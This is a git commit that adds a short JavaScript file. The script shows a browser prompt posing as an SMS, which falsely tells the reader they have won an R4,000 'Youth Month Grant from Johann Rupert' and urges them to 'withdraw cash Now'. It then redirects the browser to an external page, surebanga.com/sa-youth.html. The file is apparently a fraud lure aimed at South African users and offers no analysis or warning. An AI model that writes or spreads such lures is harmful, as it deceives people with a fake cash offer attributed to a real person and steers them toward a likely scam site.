c8f12ec922569cc480340159b76907b9b175d78b
surebanga <erongukpe@gmail.com>
2025-06-03 09:38:46 +0100

    Create sayouth-active.js

---
+++ sayouth-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW R4,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive R4,000 Youth Month Grant from Johann Rupert, Press Ok to withdraw cash Now ','WITHDRAW R4,000');
+if (password != 'WITHDRAW R4,000') {
+location.href='https://surebanga.com/sa-youth.html';
+}
